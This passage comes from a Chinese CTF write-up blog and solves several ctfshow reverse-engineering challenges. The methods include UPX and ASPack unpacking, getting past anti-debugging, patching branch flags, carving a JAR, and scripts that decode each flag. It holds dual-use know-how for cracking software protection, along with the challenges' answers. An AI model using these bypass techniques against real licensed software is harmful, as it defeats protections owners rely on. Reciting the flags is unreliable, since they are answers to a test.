<p>显然第二位不是1也就是说不会执行里面的两个函数，再分析&#x3D;&#x3D;sub_401520&#x3D;&#x3D;</p>
<p><img src="/../images/ctfshow/re5%2012.png"></p>
<p>可以得知这里调用了1.dll然后再输出字符串，所以我们好像需要得知1.dll干了什么事情但竟然它会输出那我们只需要让前面的if语句执行即可这里我们现在if语句处与&#x3D;&#x3D;return sub_40163E(i);&#x3D;&#x3D;下断点</p>
<p><img src="/../images/ctfshow/re5%2013.png"></p>
<p><img src="/../images/ctfshow/re5%2014.png"></p>
<p>进入动调，先F9运行至第一个断点处再F7步进至此处，将正则值ZF改为1</p>
<p><img src="/../images/ctfshow/re5%2015.png"></p>
<p><img src="/../images/ctfshow/re5%2016.png"></p>
<p>之后再F9后就会跳出flag了</p>
<p><img src="/../images/ctfshow/re5%2017.png"></p>
<p>最后得到flag{cef23bce78c190884ba7a6dfa5fc4675}</p>
<h2 id="红包题-武穆遗书"><a href="#红包题-武穆遗书" class="headerlink" title="红包题 武穆遗书"></a>红包题 武穆遗书</h2><p>先查壳，发现有一个upx壳，且为32位可执行文件</p>
<p><img src="/../images/ctfshow/wumu%201.png"></p>
<p>丢入upx文件夹进行自动脱壳</p>
<p><img src="/../images/ctfshow/wumu%202.png"></p>
<p>用ida32打开进行分析,在动调的时候发现很多地方会跳出正常一步一步的调试让程序继续运行下去</p>
<p>分析可知在动调中会分别调用两个函数（&#x3D;&#x3D;sub_4011D0&#x3D;&#x3D;，&#x3D;&#x3D;sub_401200&#x3D;&#x3D;）让程序直接结束这里有两种方法</p>
<p><img src="/../images/ctfshow/wumu%203.png"></p>
<p>一种是当程序运行至jz处时，将他的zf值改成相反的数，使其继续运行下去</p>
<p>另一种则是直接改变&#x3D;&#x3D;EIP&#x3D;&#x3D;指针使其直接跳过函数但是第二种方法实验一下在这道题是不行的</p>
<p>而静态分析发现改题的程序逻辑是比较v4与v6（输入值）的值是否一致，否v4是在程序要求输入之前就已经变换好了，再与输入值作比较，因此只需要动调至合适的位置即可得到flag</p>
<p>但是动调至&#x3D;&#x3D;sub_401280&#x3D;&#x3D;时会发生报错，并且怎么都不会继续执行</p>
<p><img src="/../images/ctfshow/wumu%204.png"></p>
<p>但是直接运行会有输入字符的页面</p>
<p><img src="/../images/ctfshow/wumu%205.png"></p>
<p>因此可以推测该程序应用了反调试的技术，在网上搜索有一种解决方法是直接将可以正常运行的程序直接attach至ida</p>
<p><img src="/../images/ctfshow/wumu%206.png"></p>
<p>在比较两个字符处打断点</p>
<p><img src="/../images/ctfshow/wumu%207.png"></p>
<p>在attach程序后直接随机输入 ，再f9运行至断点处，找到eax寄存器就是flag</p>
<p><img src="/../images/ctfshow/wumu%208.png"></p>
<p><img src="/../images/ctfshow/wumu%209.png"></p>
<p>flag：flag{fmf_is_great!}</p>
<h2 id="红包六"><a href="#红包六" class="headerlink" title="红包六"></a>红包六</h2><p>得到一个jar文件，运行程序</p>
<p><img src="/../images/ctfshow/hongbao6%201s.png"></p>
<p>这里把后缀改为zip打开压缩包，打开java文件</p>
<p><img src="/../images/ctfshow/hongbao6%202.png"></p>
<p>可以看到是将输入的字符串使用密钥&#x3D;&#x3D;easy_key&#x3D;&#x3D;进行DES加密，再与base64进行比较，但是代码中也有明显的提示这里没有flag，解密出来也显示不是flag</p>
<p><img src="/../images/ctfshow/hongbao6%203.png"></p>
<p>检查压缩包可以解压前是5kb而解压后确实1kb说明没有解压完全，用010editor打开可以搜索zip的文件头&#x3D;&#x3D;50 4B 03 04&#x3D;&#x3D;可以看见有多个文件头</p>
<p><img src="/../images/ctfshow/hongbao6%204.png"></p>
<p>前两个是压缩包解压出来的，而第三个可以是未解压出来的，再找到zip的文件尾</p>
<p>这里可以用脚本将压缩包脱出直接保存为java文件尝试用jd反编译</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">zlib</span></span><br><span class="line"><span class="variable">inflator</span> <span class="operator">=</span> zlib.decompressobj(-zlib.MAX_WBITS)</span><br><span class="line">f=open(<span class="string">&#x27;EzJar.jar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f.seek(<span class="number">659</span>)</span><br><span class="line">a=f.read(<span class="number">3248</span>)</span><br><span class="line">f.close()</span><br><span class="line">x = inflator.decompress(a)</span><br><span class="line">f=open(<span class="string">&#x27;EzJar.class&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(x)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p><img src="/../images/ctfshow/hongbao6%206.png"></p>
<p>最后分析可知算法为DES，密钥为Ctf3r_me  密文为Dg&#x2F;TZuRXF4+UwSZ8Dpwgw8+VOoHVl1YlPL1QRVhroCy4ptnKEcdC05iXcpLyDnuR</p>
<p>解密后可以得到flag</p>
<p><img src="/../images/ctfshow/hongbao6%207.png"></p>
<p>flag:ctfshow{eb5e2541-58e6-4f8f-ae6f-5c7a6f920d73}</p>
<h2 id="数学不及格"><a href="#数学不及格" class="headerlink" title="数学不及格"></a>数学不及格</h2><p>拿到文件先查壳</p>
<p><img src="/../images/ctfshow/shuxue%201.png"></p>
<p>是一个Linux可执行文件，且是64位的，用ida64进行分析</p>
<p><img src="/../images/ctfshow/shuxue%202.png"></p>
<p>可以发现是一个类似于解方程的题，但是这里有五个未知数，却只有四个等式，而v4与v9的关系由一个&#x3D;&#x3D;f&#x3D;&#x3D;函数决定，查看f函数</p>
<p><img src="/../images/ctfshow/shuxue%203.png"></p>
<p>而这个函数就是&#x3D;&#x3D;斐波那契数列&#x3D;&#x3D;而v9则是斐波那契数列第v4项的值，而v4又是在1至200之间</p>
<p>首先先将前三个式子</p>
<p>​                                     v9 - v10 &#x3D; 0x233F0E151C</p>
<p>​                                     v9 - v11 &#x3D; 0x1B45F81A32</p>
<p>​                                     v9 - v12 &#x3D; 0x244C071725</p>
<p>将三个式子联立相加得到</p>
<p>​                                     3*v9-(v10+v11+v12)&#x3D;62d10d4673</p>
<p>再与第四个式子v4 + v12 + v11 + v10 &#x3D; 0x13A31412F8C相加得到</p>
<p>​                                    3*v9+v4&#x3D;19D024E75FF(1773860189695)</p>
<p>又因为v4只在1至200的范围内，数字很小因此可以忽略不记求出v9的近似值</p>
<p>​                                      v9&#x3D;1773860189695&#x2F;3(591286729898)</p>
<p>然后找个在线网站查看一下&#x3D;&#x3D;斐波那契数列&#x3D;&#x3D;找到v9的近似值</p>
<p><img src="/../images/ctfshow/shuxue%204.png"></p>
<p>可以看到数列的第58位与v9十分相似，因此可以得出v9为591286729879，v4为58，剩下的就是解方程了，这里可以使用&#x3D;&#x3D;z3&#x3D;&#x3D;模块求解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">v4,v9,v10,v11,v12=Ints(<span class="string">&#x27;v4 v9 v10 v11 v12&#x27;</span>)</span><br><span class="line"></span><br><span class="line">v9 = <span class="number">591286729879</span></span><br><span class="line">v4=<span class="number">58</span></span><br><span class="line">a = <span class="string">&quot;0x233F0E151C&quot;</span>  </span><br><span class="line">a1 = <span class="built_in">int</span>(a, <span class="number">16</span>)  </span><br><span class="line">b = <span class="string">&quot;0x1B45F81A32&quot;</span>  </span><br><span class="line">b1 = <span class="built_in">int</span>(b, <span class="number">16</span>) </span><br><span class="line">c = <span class="string">&quot;0x244C071725&quot;</span>  </span><br><span class="line">c1 = <span class="built_in">int</span>(c, <span class="number">16</span>) </span><br><span class="line">d = <span class="string">&quot;0x13A31412F8C&quot;</span>  </span><br><span class="line">d1 = <span class="built_in">int</span>(d, <span class="number">16</span>) </span><br><span class="line">s = Solver()</span><br><span class="line">s.add(v9-v10==a1)</span><br><span class="line">s.add(v9-v11==b1)</span><br><span class="line">s.add(v9-v12==c1)</span><br><span class="line">s.add(v4+v12+v11+v10==d1)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure>

<p><img src="/../images/ctfshow/shuxue%205.png"></p>
<p>然后将这些值都转为16进制拼接起来其中argv[4]&#x3D;hex(v4+25923)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">argv = &#123;&#125;</span><br><span class="line">argv[<span class="number">0</span>]=<span class="built_in">hex</span>(<span class="number">439904987003</span>)[<span class="number">2</span>:]</span><br><span class="line">argv[<span class="number">1</span>]=<span class="built_in">hex</span>(<span class="number">474148725349</span>)[<span class="number">2</span>:]</span><br><span class="line">argv[<span class="number">2</span>]=<span class="built_in">hex</span>(<span class="number">435392374130</span>)[<span class="number">2</span>:]</span><br><span class="line">argv[<span class="number">3</span>]=<span class="built_in">hex</span>(<span class="number">58</span>+<span class="number">25923</span>)[<span class="number">2</span>:]</span><br><span class="line">c=argv[<span class="number">0</span>]+argv[<span class="number">1</span>]+argv[<span class="number">2</span>]+argv[<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(c).decode())</span><br></pre></td></tr></table></figure>

<p><img src="/../images/ctfshow/shuxue%206.png"></p>
<p>得到flag：flag{newbee_here}</p>
<h2 id="flag白给"><a href="#flag白给" class="headerlink" title="flag白给"></a>flag白给</h2><p>拿到程序先查壳</p>
<p><img src="/../images/ctfshow/x%201.png"></p>
<p>发现是一个32位的可执行文件，并且是一个upx壳，将其脱壳</p>
<p><img src="/../images/ctfshow/x%202.png"></p>
<p>脱壳后用ida打开静态分析，按f5进行反编译却没有反应，因此可以选择动态调试，用odbg打开，之后选择按ASCII搜索</p>
<p><img src="/../images/ctfshow/x%203.png"></p>
<p>找到关键字&#x3D;&#x3D;成功了&#x3D;&#x3D;</p>
<p><img src="/../images/ctfshow/x%204.png"></p>
<p>之后进入查看汇编代码</p>
<p><img src="/../images/ctfshow/x%205.png"></p>
<p>经过动调可知程序会将输入的序列号与&#x3D;&#x3D;HackAv&#x3D;&#x3D;对比，若相同则会输出成功，验证一下</p>
<p><img src="/../images/ctfshow/x%206.png"></p>
<p>因此flag为：flag{HackAv}(真白给啊)</p>
<h2 id="签退"><a href="#签退" class="headerlink" title="签退"></a>签退</h2><p>拿到软件发现是一个pyc文件可以利用uncompyle6来进行反编译在cmd中输入命令&#x3D;&#x3D;uncompyle6 re3.pyc &gt; re.py&#x3D;&#x3D;</p>
<p><img src="/../images/ctfshow/qt.png"></p>
<p>之后便得到反编译后的py文件</p>
<p><img src="/../images/ctfshow/qt1.png"></p>
<p>可以看到进行了两次加密分别是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">origin_bytes</span>):</span><br><span class="line">    c_bytes = [ (<span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>).<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(b)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> origin_bytes ]</span><br><span class="line">    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    nums = <span class="built_in">len</span>(c_bytes) // <span class="number">3</span></span><br><span class="line">    remain = <span class="built_in">len</span>(c_bytes) % <span class="number">3</span></span><br><span class="line">    integral_part = c_bytes[<span class="number">0</span>:<span class="number">3</span> * nums]</span><br><span class="line">    <span class="keyword">while</span> integral_part:</span><br><span class="line">        tmp_unit = (<span class="string">&#x27;&#x27;</span>).join(integral_part[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">        tmp_unit = [ <span class="built_in">int</span>(tmp_unit[x:x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>] ]</span><br><span class="line">        resp += (<span class="string">&#x27;&#x27;</span>).join([ c_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit ])</span><br><span class="line">        integral_part = integral_part[<span class="number">3</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">        remain_part = (<span class="string">&#x27;&#x27;</span>).join(c_bytes[<span class="number">3</span> * nums:]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;0&#x27;</span> * <span class="number">8</span></span><br><span class="line">        tmp_unit = [ <span class="built_in">int</span>(remain_part[x:x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>] ][:remain + <span class="number">1</span>]</span><br><span class="line">        resp += (<span class="string">&#x27;&#x27;</span>).join([ c_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit ]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;.&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> rend(resp)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rend</span>(<span class="params">s</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encodeCh</span>(<span class="params">ch</span>):</span><br><span class="line">        f = <span class="keyword">lambda</span> x: <span class="built_in">chr</span>((<span class="built_in">ord</span>(ch) - x + <span class="number">2</span>) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">if</span> ch.islower():</span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">97</span>)</span><br><span class="line">        <span class="keyword">if</span> ch.isupper():</span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">65</span>)</span><br><span class="line">        <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="string">&#x27;&#x27;</span>).join(encodeCh(c) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br></pre></td></tr></table></figure>

<p>而最后得到密文&#x3D;&#x3D;BozjB3vlZ3ThBn9bZ2jhOH93ZaH9&#x3D;&#x3D;</p>
<p>而要逆向则需要从前往后分析可以看到是对密文进行了一个位移操作，而且是一个简单的凯撒密码，偏移量为2</p>
<p>解密一下得到&#x3D;&#x3D;ZmxhZ3tjX3RfZl9zX2hfMF93XyF9&#x3D;&#x3D;而对于上一个其实就是一个base64编码，放到工具解密既可以得到密文</p>
<p>flag:flag{c_t_f_s_h_0_w_!}</p>
<h2 id="真的是签到"><a href="#真的是签到" class="headerlink" title="真的是签到"></a>真的是签到</h2><p>得到一个zip文件，进行解压发现需要密码</p>
<p><img src="/../images/ctfshow/qd1.png"></p>
<p>但是题目没有给任何密码提示，猜测可能是压缩包的一个伪加密，用&#x3D;&#x3D;010editor&#x3D;&#x3D;打开</p>
<p><img src="/../images/ctfshow/qd2.png"></p>
<p>可以看到全局加密处为&#x3D;&#x3D;00 00&#x3D;&#x3D;之后可以确定是压缩包的伪加密我们只需要找到&#x3D;&#x3D;全局方式位标记&#x3D;&#x3D;将&#x3D;&#x3D;09 00&#x3D;&#x3D;改为&#x3D;&#x3D;00 00&#x3D;&#x3D;即可</p>
<p><img src="/../images/ctfshow/qd3.png"></p>
<p>之后再解压可以得到需要逆向的可执行文件</p>
<p><img src="/../images/ctfshow/qd4.png"></p>
<p>老规矩先查壳</p>
<p><img src="/../images/ctfshow/qd5.png"></p>
<p>发现有一个ASP的壳，我们用odbg打开，利用ESP定律进行脱壳</p>
<p><img src="/../images/ctfshow/qd6.png"></p>
<p>打开memory map可以看到&#x3D;&#x3D;00409001&#x3D;&#x3D;正式aspack壳的入口地址</p>
<p><img src="/../images/ctfshow/qd7.png"></p>
<p>而壳最终都会跳转至OEP进入程序，此时我们按下F8,程序单步执行，会发先esp寄存器处变红，也就是说esp发生了变化，我们右键esp选择数据窗口跟随</p>
<p><img src="/../images/ctfshow/qd8.png"></p>
<p>之后我们在下方找到&#x3D;&#x3D;0060FF50&#x3D;&#x3D;在其数据处右键，断点选择硬件访问然后选择BYTE就可以在硬件断点处看到</p>
<p><img src="/../images/ctfshow/qd9.png"></p>
<p>之后按F9运行，程序则会停止至&#x3D;&#x3D;popad&#x3D;&#x3D;处</p>
<p><img src="/../images/ctfshow/qd10.png"></p>
<p>之后单步执行至retn处，而前面的push其实也大有说法，这个以后有机会详细讲讲，单步运行至retn后会发现进入至一个页面，而这个页面就是oep的位置，此时会发现是一些字符，这是因为前面的壳压缩或加密导致odbg没有及时的去分析，此时我们需要右键分析选择分析代码</p>
<p><img src="/../images/ctfshow/qd11.png"></p>
<p>然后右键选择用&#x3D;&#x3D;Ollydump&#x3D;&#x3D;脱壳调试进程，点击脱壳，另存为&#x3D;&#x3D;签到1.exe&#x3D;&#x3D;这时我们再进行查壳发现还多了upx壳</p>
<p><img src="/../images/ctfshow/qd13.png"></p>
<p>使用命令.&#x2F;upx -d xxx.exe进行脱壳，发现依然报错（我嘞个骚刚）</p>
<p><img src="/../images/ctfshow/qd14.png"></p>
<p>去网上查看这一段报错，发现很有可能是upx的防脱壳（具体可以看看:<a href="https://www.52pojie.cn/thread-326995-1-1.html%EF%BC%89,%E7%94%A8010editor%E6%89%93%E5%BC%80%E7%9C%8B%E7%9C%8B">https://www.52pojie.cn/thread-326995-1-1.html）,用010editor打开看看</a></p>
<p><img src="/../images/ctfshow/qd15.png"></p>
<p>奇怪了明明是upx壳为什么会有vmp我们把vmp改成UPX(55 50 58)</p>
<p><img src="/../images/ctfshow/qd16.png"></p>
<p>但是改了之后还是不太行，只能试试upx的手动脱壳了，还是根据上面的esp定律dump出脱壳后的文件，之后用ida打开，再根据关键字终于定位到了检验函数</p>
<p><img src="/../images/ctfshow/qd17.png"></p>
<p>可以发现是对输入的字符串进行下标异或之后再与dword_402000进行对比得到结果</p>
<p>这里写一个c脚本来解密</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> res[<span class="number">18</span>] = &#123; <span class="number">0x6c</span>,<span class="number">0x2f</span>,<span class="number">0x30</span>,<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x33</span>,<span class="number">0xffffffb6</span>,<span class="number">0xffffffbf</span>,<span class="number">0xffffffa0</span>,<span class="number">0xffffffcf</span>,<span class="number">0x7c</span>,<span class="number">0x71</span>,<span class="number">0x6a</span>,<span class="number">0x6c</span>,<span class="number">0x70</span>,<span class="number">0x64</span>,<span class="number">0x75</span>,<span class="number">0x63</span> &#125;;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">17</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">   &#123;</span><br><span class="line">     res[i] = res[i]^(<span class="number">17</span>-i);</span><br><span class="line">	 <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,res[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里如果要用python要注意使用gb2312解码</p>
<p><img src="/../images/ctfshow/qd18.png"></p>
<p>得到flag:ctfshow{签到?????}</p>
<h2 id="批量生产的伪劣产品"><a href="#批量生产的伪劣产品" class="headerlink" title="批量生产的伪劣产品"></a>批量生产的伪劣产品</h2><p>这一题就相对比较简单了直接把 apk文件丢尽jadx分析，查看&#x3D;&#x3D;AndroidManifest.xml&#x3D;&#x3D;的内容找入口&#x3D;&#x3D;appinventor.ai_QA629A242D5E83EFA948B9020CD35CB60.checkme.a”&#x3D;&#x3D;</p>
<p>之后再里面往下翻就可以看见明显的flag了</p>
<p>flag:ctfshow{群主最爱36D}</p>
<h2 id="来一个派森"><a href="#来一个派森" class="headerlink" title="来一个派森"></a>来一个派森</h2><p>题目停供了一个python编译打包的exe文件所以需要进行反编译，将需要编译的文件拖入pyinstxtractor-master文件夹，在文件夹终端输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python pyinstxtractor.py checkme.exe</span><br></pre></td></tr></table></figure>

<p>打开生成的&#x3D;&#x3D;checkme.exe_extracted&#x3D;&#x3D;文件夹，并在里面找到checkme.pyc</p>
<p>之后便利用&#x3D;&#x3D;uncompyle6&#x3D;&#x3D;进行反编译输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uncompyle6 checkme.pyc &gt; checkme.py</span><br></pre></td></tr></table></figure>

<p><img src="/../images/ctfshow/ps1.png"></p>
<p>查看checkme.py</p>
<p><img src="/../images/ctfshow/ps2.png"></p>
<p>可以看到这一段的逻辑就是将用户输入的flag先进行base58加密，再每一个与自己的下标异或，得到check，所以写一个解密脚本将加密后的base58的内容解密出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">check = [</span><br><span class="line">    <span class="string">&quot;&#x27;A&#x27;&quot;</span>, <span class="string">&quot;&#x27;5&#x27;&quot;</span>, <span class="string">&quot;&#x27;q&#x27;&quot;</span>, <span class="string">&quot;&#x27;O&#x27;&quot;</span>, <span class="string">&quot;&#x27;g&#x27;&quot;</span>, <span class="string">&quot;&#x27;q&#x27;&quot;</span>, <span class="string">&quot;&#x27;d&#x27;&quot;</span>, <span class="string">&quot;&#x27;\\x7f&#x27;&quot;</span>, </span><br><span class="line">    <span class="string">&quot;&#x27;[&#x27;&quot;</span>, <span class="string">&quot;&#x27;\\x7f&#x27;&quot;</span>, <span class="string">&quot;&#x27;s&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#123;&#x27;&quot;</span>, <span class="string">&quot;&#x27;G&#x27;&quot;</span>, <span class="string">&quot;&#x27;A&#x27;&quot;</span>, <span class="string">&quot;&#x27;x&#x27;&quot;</span>, <span class="string">&quot;&#x27;`&#x27;&quot;</span>, <span class="string">&quot;&#x27;D&#x27;&quot;</span>, </span><br><span class="line">    <span class="string">&quot;&#x27;@&#x27;&quot;</span>, <span class="string">&quot;&#x27;K&#x27;&quot;</span>, <span class="string">&quot;&#x27;c&#x27;&quot;</span>, <span class="string">&quot;&#x27;-&#x27;&quot;</span>, <span class="string">&quot;&#x27;c&#x27;&quot;</span>, <span class="string">&quot;&#x27; &#x27;&quot;</span>, <span class="string">&quot;&#x27;G&#x27;&quot;</span>, <span class="string">&quot;&#x27;+&#x27;&quot;</span>, <span class="string">&quot;&#x27;+&#x27;&quot;</span>, </span><br><span class="line">    <span class="string">&quot;&#x27;|&#x27;&quot;</span>, <span class="string">&quot;&#x27;x&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#125;&#x27;&quot;</span>, <span class="string">&quot;&#x27;J&#x27;&quot;</span>, <span class="string">&quot;&#x27;h&#x27;&quot;</span>, <span class="string">&quot;&#x27;\\\\&#x27;&quot;</span>, <span class="string">&quot;&#x27;l&#x27;&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(check)):</span><br><span class="line">    char = check[i][<span class="number">1</span>:-<span class="number">1</span>]  <span class="comment"># 去掉单引号</span></span><br><span class="line">    <span class="keyword">if</span> char.startswith(<span class="string">&#x27;\\x&#x27;</span>):  <span class="comment"># 处理转义字符</span></span><br><span class="line">        char = <span class="built_in">chr</span>(<span class="built_in">int</span>(char[<span class="number">2</span>:], <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">elif</span> char == <span class="string">&#x27;\\\\&#x27;</span>:</span><br><span class="line">        char = <span class="string">&#x27;\\&#x27;</span></span><br><span class="line">    ascii_val = <span class="built_in">ord</span>(char)  <span class="comment"># 转换为ASCII值</span></span><br><span class="line">    original_val = ascii_val ^ i  <span class="comment"># 执行XOR操作</span></span><br><span class="line">    tmp.append(<span class="built_in">chr</span>(original_val))  <span class="comment"># 转换回字符并添加到tmp中</span></span><br><span class="line"></span><br><span class="line">tmp_string = <span class="string">&#x27;&#x27;</span>.join(tmp)</span><br><span class="line"><span class="built_in">print</span>(tmp_string)</span><br></pre></td></tr></table></figure>

<p>得到&#x3D;&#x3D;A4sLctbxSvypKLvoTQYp9v6P32fcaWvCL&#x3D;&#x3D;最后放到网上base58解密</p>
<p><img src="/../images/ctfshow/ps3.png"></p>
<p>得到flag:ctfshow{zhe_bu_shi_flag}</p>
<h2 id="好好学习天天向上"><a href="#好好学习天天向上" class="headerlink" title="好好学习天天向上"></a>好好学习天天向上</h2><p>拿到exe文件我们先查壳，为无壳64位的可执行文件，之后用ida64打开，把辨识度高的函数名字改掉</p>
<p><img src="/../images/ctfshow/study1.png"></p>
<p>之后进入&#x3D;&#x3D;sub_140001000&#x3D;&#x3D;查看函数逻辑</p>
<p><img src="/../images/ctfshow/study.png"></p>
<p>在这里可以推断出输入的flag必须有32个，接着再分析&#x3D;&#x3D;sub_140001140&#x3D;&#x3D;函数</p>
<p><img src="/../images/ctfshow/study2.png"></p>
<p>这里其实就是判断输入的flag是不是由&#x3D;&#x3D;aAbdefglostuyp[]&#x3D;&#x3D;里的字符组成的，如果是则会返回&#x3D;&#x3D;aAbdefglostuyp[]&#x3D;&#x3D;相应的索引值， 其实也就是说flag必须由&#x3D;&#x3D;aAbdefglostuyp[]&#x3D;&#x3D;内的字符组成</p>
<p><img src="/../images/ctfshow/study3.png"></p>
<p>可以看到是由&#x3D;&#x3D;abdefglostuyp{}_&#x3D;&#x3D;组成，之后就可以写爆破脚本了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">char</span>):</span><br><span class="line">    check_string = <span class="string">&#x27;abdefglostuyp&#123;&#125;_&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(check_string)):</span><br><span class="line">        <span class="keyword">if</span> char == check_string[i]:</span><br><span class="line">            <span class="keyword">return</span> i  <span class="comment"># 找到字符后返回其索引</span></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>  <span class="comment"># 如果没有找到字符，返回 -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_array</span>(<span class="params">byte_array</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte_array) != <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    v4 = <span class="number">0</span></span><br><span class="line">    v2 = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">        byte_value = byte_array[i]</span><br><span class="line">        result = check(byte_value)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> result &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        v2 = <span class="number">17</span> * (result + <span class="number">16</span> * i)</span><br><span class="line">        v4 += check(byte_array[i + <span class="number">1</span>])  <span class="comment"># 使用 check 函数获取下一个字符的索引值</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> v4 == <span class="number">0x1C836D8E5C11047F</span> <span class="keyword">and</span> byte_array[<span class="number">31</span>] == <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_array</span>():</span><br><span class="line">    allowed_chars = <span class="string">&#x27;abdefglostuyp&#123;&#125;_&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> [random.choice(allowed_chars) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成满足条件的字符数组</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    byte_array = generate_random_array()</span><br><span class="line">    <span class="keyword">if</span> validate_array(byte_array):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;找到的字符数组:&quot;</span>, <span class="string">&#x27;&#x27;</span>.join(byte_array))</span><br></pre></td></tr></table></figure>

<p>但是其实这32个基本是很难爆出来的，去网上别人的wp发现大家对于flag都是猜，因为&#x3D;&#x3D;aAbdefglostuyp[]&#x3D;&#x3D;的字符正好可以拼成题目的名字，也就是good good study day day up然后用flag{}包住再用_连接发现正好满足32位，提交显示正确，what can i say</p>
<p>flag:flag{good_good_study_day_day_up}</p>
<h2 id="屏幕裂开了"><a href="#屏幕裂开了" class="headerlink" title="屏幕裂开了"></a>屏幕裂开了</h2><p>因为是apk文件我们用jadx打开查看</p>
<p><img src="/../images/ctfshow/pm1.png"></p>
<p>这里行成一个码表用两个序列s和k生成之后调用checkflag(char[] cArr, String str);进行检测</p>
<p><img src="/../images/ctfshow/pm2.png"></p>
<p>因此我们可以写出解密脚本</p>
